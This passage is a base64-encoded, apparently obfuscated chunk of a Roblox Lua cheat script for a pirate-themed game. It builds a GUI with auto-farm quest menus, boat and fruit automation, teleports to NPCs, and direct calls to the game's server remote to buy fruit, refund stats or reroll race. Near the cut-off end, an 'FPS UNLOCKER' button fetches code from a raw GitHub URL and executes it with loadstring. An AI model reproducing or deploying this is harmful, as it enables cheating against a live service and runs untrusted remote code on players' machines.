CBUaXRsZUZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIE1haW4pCiAgICAgICAgICAgICAgICBUaXRsZUZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgMTIwLCAwLCAzMikKICAgICAgICAgICAgICAgIFRpdGxlRnJhbWUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTUsIDAsIDE1KQogICAgICAgICAgICAgICAgVGl0bGVGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTIsIDEyLCAxMikKICAgICAgICAgICAgICAgIFRpdGxlRnJhbWUuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBUaXRsZVRleHQgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIFRpdGxlRnJhbWUpCiAgICAgICAgICAgICAgICBUaXRsZVRleHQuVGV4dCA9ICJUT04gNjE4IgogICAgICAgICAgICAgICAgVGl0bGVUZXh0LlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKICAgICAgICAgICAgICAgIFRpdGxlVGV4dC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgVGl0bGVUZXh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgVGl0bGVUZXh0LkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQmxhY2sKICAgICAgICAgICAgICAgIFRpdGxlVGV4dC5UZXh0U2l6ZSA9IDE2CgogICAgICAgICAgICAgICAgbG9jYWwgQ2xvc2VCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iLCBNYWluKQogICAgICAgICAgICAgICAgQ2xvc2VCdG4uVGV4dCA9ICJYIgogICAgICAgICAgICAgICAgQ2xvc2VCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICAgICAgICAgIENsb3NlQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxNTAsIDE1MCwgMTUwKQogICAgICAgICAgICAgICAgQ2xvc2VCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjApCiAgICAgICAgICAgICAgICBDbG9zZUJ0bi5TaXplID0gVURpbTIubmV3KDAsIDMwLCAwLCAzMCkKICAgICAgICAgICAgICAgIENsb3NlQnRuLlBvc2l0aW9uID0gVURpbTIubmV3KDEsIC00NSwgMCwgMTUpCiAgICAgICAgICAgICAgICBDbG9zZUJ0bi5UZXh0U2l6ZSA9IDE0CiAgICAgICAgICAgICAgICBsb2NhbCBDbG9zZUNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBDbG9zZUJ0bikgQ2xvc2VDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgQ2xvc2VCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgR2FsYXh5SHViR3VpOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgICAgIEdhbGF4eUh1Ykd1aSA9IG5pbAogICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgIGxvY2FsIENvbnRlbnQgPSBJbnN0YW5jZS5uZXcoIlNjcm9sbGluZ0ZyYW1lIiwgTWFpbikKICAgICAgICAgICAgICAgIENvbnRlbnQuU2l6ZSA9IFVEaW0yLm5ldygwLjksIDAsIDAuNzUsIDApCiAgICAgICAgICAgICAgICBDb250ZW50LlBvc2l0aW9uID0gVURpbTIubmV3KDAuMDUsIDAsIDAuMTUsIDApCiAgICAgICAgICAgICAgICBDb250ZW50LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICBDb250ZW50LlNjcm9sbEJhclRoaWNrbmVzcyA9IDIKICAgICAgICAgICAgICAgIENvbnRlbnQuQ2FudmFzU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKQogICAgICAgICAgICAgICAgQ29udGVudC5BdXRvbWF0aWNDYW52YXNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlkKICAgICAgICAgICAgICAgIGxvY2FsIExheW91dCA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IiwgQ29udGVudCk7IExheW91dC5QYWRkaW5nID0gVURpbS5uZXcoMCwgOCkKCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBDcmVhdGVCdG4odGV4dCwgY29sb3IsIHBhcmVudCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBiID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIiwgcGFyZW50IG9yIENvbnRlbnQpCiAgICAgICAgICAgICAgICAgICAgYi5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDQ1KQogICAgICAgICAgICAgICAgICAgIGIuVGV4dCA9IHRleHQKICAgICAgICAgICAgICAgICAgICBiLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNSwgMjUsIDI1KQogICAgICAgICAgICAgICAgICAgIGIuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICAgICAgICAgICAgICAgICAgYi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICAgICAgICAgICAgICBiLlRleHRTaXplID0gMTQKICAgICAgICAgICAgICAgICAgICBsb2NhbCBiQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIGIpIGJDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBiU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIsIGIpIGJTdHJva2UuQ29sb3IgPSBjb2xvciBiU3Ryb2tlLlRoaWNrbmVzcyA9IDEKICAgICAgICAgICAgICAgICAgICByZXR1cm4gYgogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gQ2xlYXJDb250ZW50KCkKICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhDb250ZW50OkdldENoaWxkcmVuKCkpIGRvIGlmIHY6SXNBKCJUZXh0QnV0dG9uIikgdGhlbiB2OkRlc3Ryb3koKSBlbmQgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCBTaG93U2VhTWVudSwgU2hvd0lzbGFuZE1lbnUsIFNob3dRdWVzdE1lbnUKCiAgICAgICAgICAgICAgICBTaG93U2VhTWVudSA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBDbGVhckNvbnRlbnQoKQogICAgICAgICAgICAgICAgICAgIGZvciBfLCBzZWEgaW4gcGFpcnMoeyJTRUEgMSIsICJTRUEgMiIsICJTRUEgMyJ9KSBkbwogICAgICAgICAgICAgICAgICAgICAgICBDcmVhdGVCdG4oc2VhLCBDb2xvcjMuZnJvbVJHQigyNTUsIDEzMCwgMCkpLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKSBTaG93SXNsYW5kTWVudShzZWEpIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIFNob3dJc2xhbmRNZW51ID0gZnVuY3Rpb24oc2VhKQogICAgICAgICAgICAgICAgICAgIENsZWFyQ29udGVudCgpCiAgICAgICAgICAgICAgICAgICAgQ3JlYXRlQnRuKCLirIUgQkFDSyIsIENvbG9yMy5mcm9tUkdCKDIwMCwgNTAsIDUwKSkuTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChTaG93U2VhTWVudSkKICAgICAgICAgICAgICAgICAgICBmb3IgXywgaXNsYW5kRGF0YSBpbiBpcGFpcnMoR2FtZURhdGFbc2VhXSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgQ3JlYXRlQnRuKGlzbGFuZERhdGEuRW1vamkgLi4gIiAiIC4uIGlzbGFuZERhdGEuTmFtZSwgaXNsYW5kRGF0YS5Db2xvcikuTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpIFNob3dRdWVzdE1lbnUoc2VhLCBpc2xhbmREYXRhKSBlbmQpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBTaG93UXVlc3RNZW51ID0gZnVuY3Rpb24oc2VhLCBpc2xhbmREYXRhKQogICAgICAgICAgICAgICAgICAgIENsZWFyQ29udGVudCgpCiAgICAgICAgICAgICAgICAgICAgQ3JlYXRlQnRuKCLirIUgQkFDSyIsIENvbG9yMy5mcm9tUkdCKDIwMCwgNTAsIDUwKSkuTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpIFNob3dJc2xhbmRNZW51KHNlYSkgZW5kKQogICAgICAgICAgICAgICAgICAgIGZvciBfLCBpbmZvIGluIHBhaXJzKGlzbGFuZERhdGEuTW9icykgZG8KICAgICAgICAgICAgICAgICAgICAgICAgQ3JlYXRlQnRuKCLimpTvuI8gWyIuLmluZm8uTGV2ZWwuLiJdICIuLmluZm8uTW9iLCBDb2xvcjMuZnJvbVJHQig1MCwgMTUwLCA1MCkpLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgX0cuQ3VycmVudFF1ZXN0RGF0YSA9IGluZm87IF9HLkF1dG9GYXJtID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCBTdG9wVGV4dCA9IFN0b3BBbGxLZXkgYW5kICgi8J+bkSBTVE9QIEFMTCBbIiAuLiBTdG9wQWxsS2V5Lk5hbWUgLi4gIl0iKSBvciAi8J+bkSBTVE9QIEFMTCBbTk9ORV0iCiAgICAgICAgICAgICAgICBsb2NhbCBTdG9wID0gQ3JlYXRlQnRuKFN0b3BUZXh0LCBDb2xvcjMuZnJvbVJHQigyMDAsIDAsIDApLCBNYWluKQogICAgICAgICAgICAgICAgU3RvcC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjEsIDAsIDAuODUsIDApOyBTdG9wLlNpemUgPSBVRGltMi5uZXcoMC44LCAwLCAwLCA1MCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgaXNCaW5kaW5nU3RvcCA9IGZhbHNlCiAgICAgICAgICAgICAgICBTdG9wLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGlzQmluZGluZ1N0b3AgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgU3RvcC5UZXh0ID0gIlByZXNzIGEga2V5Li4uIgogICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgIGxvY2FsIGJpbmRDb25uID0gVXNlcklucHV0U2VydmljZS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgICAgICAgICAgICAgaWYgaXNCaW5kaW5nU3RvcCBhbmQgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuS2V5Ym9hcmQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBTdG9wQWxsS2V5ID0gaW5wdXQuS2V5Q29kZQogICAgICAgICAgICAgICAgICAgICAgICBpc0JpbmRpbmdTdG9wID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgU3RvcC5UZXh0ID0gIvCfm5EgU1RPUCBBTEwgWyIgLi4gaW5wdXQuS2V5Q29kZS5OYW1lIC4uICJdIgogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBNYWluLkRlc3Ryb3lpbmc6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgaWYgYmluZENvbm4gdGhlbiBiaW5kQ29ubjpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgU2hvd1NlYU1lbnUoKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQpCiAgICBlbmQKICAgIAogICAgLS0gU2VhIEV2ZW50IFBhZ2UgQ29udGVudAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5TZWFFdmVudCwgIkxldmlhdGhhbiIsIDEpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuU2VhRXZlbnQsICJBdXRvIEZpbmQgTGV2aWF0aGFuIiwgIkF1dG9GaW5kTGV2aWF0aGFuIiwgMikKICAgIAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5TZWFFdmVudCwgIkJvYXQgQ29udHJvbCIsIDMpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuU2VhRXZlbnQsICJBdXRvIEJ1eSBCb2F0ICYgU2l0IiwgIkF1dG9CdXlCb2F0IiwgNCkKICAgIGNyZWF0ZUN5Y2xlKFBhZ2VzLlNlYUV2ZW50LCAiU2VsZWN0IEJvYXQiLCAiU2VsZWN0ZWRCb2F0IiwgeyJTcGVlZGJvYXQiLCAiTHV4dXJ5IEJvYXQiLCAiR3JhbmQgQnJpZ2FkZSIsICJHdWFyZGlhbiIsICJMYW50ZXJuIiwgIk1pcmFjbGUiLCAiU2xvb3AiLCAiRGluZ2h5IiwgIkJlYXN0IEh1bnRlciIsICJTbGVpZ2gifSwgNSkKICAgIAogICAgLS0gU2hvcCBQYWdlIENvbnRlbnQKICAgIGxvY2FsIGZ1bmN0aW9uIGNyZWF0ZUJ1eUJ0bihwYXJlbnQsIHRleHQsIGFyZ3MsIG9yZGVyLCB0YXJnZXRJbmZvKQogICAgICAgIGxvY2FsIGJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgYnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMjUpCiAgICAgICAgYnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzMCwgMzAsIDQwKQogICAgICAgIGJ0bi5UZXh0ID0gdGV4dAogICAgICAgIGJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCkKICAgICAgICBidG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICBidG4uVGV4dFNpemUgPSA5CiAgICAgICAgYnRuLkxheW91dE9yZGVyID0gb3JkZXIKICAgICAgICBidG4uUGFyZW50ID0gcGFyZW50CiAgICAgICAgbG9jYWwgYyA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBjLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsNCkgYy5QYXJlbnQgPSBidG4KICAgICAgICBidG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIHNhdmVkQ0ZyYW1lID0gbmlsCiAgICAgICAgICAgIGlmIGNoYXJhY3RlciBhbmQgcm9vdFBhcnQgdGhlbiBzYXZlZENGcmFtZSA9IHJvb3RQYXJ0LkNGcmFtZSBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIHRhcmdldFBvcyA9IG5pbAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgdHlwZW9mKHRhcmdldEluZm8pID09ICJWZWN0b3IzIiB0aGVuCiAgICAgICAgICAgICAgICB0YXJnZXRQb3MgPSBDRnJhbWUubmV3KHRhcmdldEluZm8pCiAgICAgICAgICAgIGVsc2VpZiB0eXBlb2YodGFyZ2V0SW5mbykgPT0gInN0cmluZyIgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgbnBjTmFtZSA9IHRhcmdldEluZm8KICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldE5QQyA9IG5pbAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBmb2xkZXJzID0gewogICAgICAgICAgICAgICAgICAgIHdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiTlBDcyIpLAogICAgICAgICAgICAgICAgICAgIHdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiTWFwIikgYW5kIHdvcmtzcGFjZS5NYXA6RmluZEZpcnN0Q2hpbGQoIk5QQ3MiKSwKICAgICAgICAgICAgICAgICAgICB3b3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIlNwYXduIikgYW5kIHdvcmtzcGFjZS5TcGF3bjpGaW5kRmlyc3RDaGlsZCgiTlBDcyIpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGZvciBfLCBmIGluIHBhaXJzKGZvbGRlcnMpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgZiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhcmdldE5QQyA9IGY6RmluZEZpcnN0Q2hpbGQobnBjTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0TlBDIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgbm90IHRhcmdldE5QQyB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMod29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSBucGNOYW1lIGFuZCB2OkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFyZ2V0TlBDID0gdgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIHRhcmdldE5QQyBhbmQgdGFyZ2V0TlBDOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgIHRhcmdldFBvcyA9IHRhcmdldE5QQy5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgMCwgMykKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHRhcmdldFBvcyBhbmQgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgd2FzQW5jaG9yZWQgPSByb290UGFydC5BbmNob3JlZAogICAgICAgICAgICAgICAgcm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICBsb2NhbCBzdGFydFRpbWUgPSB0aWNrKCkKICAgICAgICAgICAgICAgIHdoaWxlIHRpY2soKSAtIHN0YXJ0VGltZSA8IDAuNSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHJvb3RQYXJ0IHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgIHJvb3RQYXJ0LkNGcmFtZSA9IHRhcmdldFBvcyAKICAgICAgICAgICAgICAgICAgICAgICAgcm9vdFBhcnQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLDAsMCkKICAgICAgICAgICAgICAgICAgICAgICAgcm9vdFBhcnQuQXNzZW1ibHlMaW5lYXJWZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIFJ1blNlcnZpY2UuSGVhcnRiZWF0OldhaXQoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUmVtb3Rlcy5Db21tRl86SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgIGlmIHJvb3RQYXJ0IHRoZW4gcm9vdFBhcnQuQW5jaG9yZWQgPSB3YXNBbmNob3JlZCBlbmQKICAgICAgICAgICAgICAgIGlmIHNhdmVkQ0ZyYW1lIHRoZW4gcm9vdFBhcnQuQ0ZyYW1lID0gc2F2ZWRDRnJhbWUgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SZW1vdGVzLkNvbW1GXzpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlNob3AsICJGcmFnbWVudHMiLCAxMykKICAgIGNyZWF0ZUJ1eUJ0bihQYWdlcy5TaG9wLCAiUmVmdW5kIFN0YXRzIiwgeyJCbGFja2JlYXJkUmV3YXJkIiwgIlJlZnVuZCIsICIyIn0sIDE0KQogICAgY3JlYXRlQnV5QnRuKFBhZ2VzLlNob3AsICJSZXJvbGwgUmFjZSIsIHsiQmxhY2tiZWFyZFJld2FyZCIsICJSZXJvbGwiLCAiMiJ9LCAxNSkKICAgIAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5TaG9wLCAiRGV2aWwgRnJ1aXQiLCAyNCkKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5TaG9wLCAiQXV0byBTdG9yZSBGcnVpdCIsICJBdXRvU3RvcmVGcnVpdCIsIDI2KQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlNob3AsICJBdXRvIEdyYWIgRnJ1aXQgKEZseSkiLCAiQXV0b0dyYWJGcnVpdCIsIDI3KQogICAgCiAgICAtLSBEZXZpbCBGcnVpdCBPcHRpb25zIGZyb20gU2NyaXB0Mi5sdWEKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5TaG9wLCAiQXV0byBSYW5kb20gRnJ1aXQiLCAiQXV0b1JhbmRvbUZydWl0IiwgMjgpCiAgICAKICAgIGRvCiAgICAgICAgbG9jYWwgUmFuZG9tRnJ1aXRCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgIFJhbmRvbUZydWl0QnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgUmFuZG9tRnJ1aXRCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjUpCiAgICAgICAgUmFuZG9tRnJ1aXRCdG4uVGV4dCA9ICJCdXkgUmFuZG9tIEZydWl0IgogICAgICAgIFJhbmRvbUZydWl0QnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIFJhbmRvbUZydWl0QnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIFJhbmRvbUZydWl0QnRuLlRleHRTaXplID0gMTAKICAgICAgICBSYW5kb21GcnVpdEJ0bi5MYXlvdXRPcmRlciA9IDI5CiAgICAgICAgUmFuZG9tRnJ1aXRCdG4uUGFyZW50ID0gUGFnZXMuU2hvcAogICAgICAgIGxvY2FsIENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkgQ29ybmVyLlBhcmVudCA9IFJhbmRvbUZydWl0QnRuCiAgICAgICAgCiAgICAgICAgUmFuZG9tRnJ1aXRCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SZW1vdGVzLkNvbW1GXzpJbnZva2VTZXJ2ZXIoIkNvdXNpbiIsICJCdXkiKQogICAgICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJSYW5kb20gZnJ1aXQgcHVyY2hhc2VkISIsIDMpCiAgICAgICAgZW5kKQogICAgZW5kCiAgICAKICAgIGRvCiAgICAgICAgbG9jYWwgRnJ1aXRJblNlcnZlckxhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgIEZydWl0SW5TZXJ2ZXJMYWJlbC5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDI1KQogICAgICAgIEZydWl0SW5TZXJ2ZXJMYWJlbC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjUsIDI1LCAzMCkKICAgICAgICBGcnVpdEluU2VydmVyTGFiZWwuVGV4dCA9ICJGcnVpdCBpbiBTZXJ2ZXI6ID8iCiAgICAgICAgRnJ1aXRJblNlcnZl" .. "ckxhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgICAgIEZydWl0SW5TZXJ2ZXJMYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbU1lZGl1bQogICAgICAgIEZydWl0SW5TZXJ2ZXJMYWJlbC5UZXh0U2l6ZSA9IDEwCiAgICAgICAgRnJ1aXRJblNlcnZlckxhYmVsLkxheW91dE9yZGVyID0gMzAKICAgICAgICBGcnVpdEluU2VydmVyTGFiZWwuUGFyZW50ID0gUGFnZXMuU2hvcAogICAgICAgIGxvY2FsIENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkgQ29ybmVyLlBhcmVudCA9IEZydWl0SW5TZXJ2ZXJMYWJlbAogICAgICAgIAogICAgICAgIC0tIFVwZGF0ZSBmcnVpdCBjb3VudAogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMikKICAgICAgICAgICAgICAgIGxvY2FsIGNvdW50ID0gMAogICAgICAgICAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyh3b3Jrc3BhY2U6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBzdHJpbmcuZmluZChvYmouTmFtZSwgIkZydWl0IikgYW5kIG9iajpJc0EoIk1vZGVsIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBjb3VudCA9IGNvdW50ICsgMQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBGcnVpdEluU2VydmVyTGFiZWwuVGV4dCA9ICJGcnVpdCBpbiBTZXJ2ZXI6ICIgLi4gY291bnQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCiAgICAKICAgIGRvCiAgICAgICAgbG9jYWwgZnBzVW5sb2NrZXJHdWkgPSBuaWwKICAgICAgICBsb2NhbCBGcHNVbmxvY2tlckJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgRnBzVW5sb2NrZXJCdG4uU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgICAgICBGcHNVbmxvY2tlckJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgICAgICBGcHNVbmxvY2tlckJ0bi5UZXh0ID0gIkZQUyBVTkxPQ0tFUiIKICAgICAgICBGcHNVbmxvY2tlckJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICBGcHNVbmxvY2tlckJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICBGcHNVbmxvY2tlckJ0bi5UZXh0U2l6ZSA9IDEwCiAgICAgICAgRnBzVW5sb2NrZXJCdG4uTGF5b3V0T3JkZXIgPSAzMgogICAgICAgIEZwc1VubG9ja2VyQnRuLlBhcmVudCA9IFBhZ2VzLlNob3AKICAgICAgICAKICAgICAgICBsb2NhbCBGcHNDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgRnBzQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIEZwc0Nvcm5lci5QYXJlbnQgPSBGcHNVbmxvY2tlckJ0bgogICAgICAgIAogICAgICAgIEZwc1VubG9ja2VyQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBub3QgZnBzVW5sb2NrZXJHdWkgb3Igbm90IGZwc1VubG9ja2VyR3VpLlBhcmVudCB0aGVuCiAgICAgICAgICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1BlcmZlY3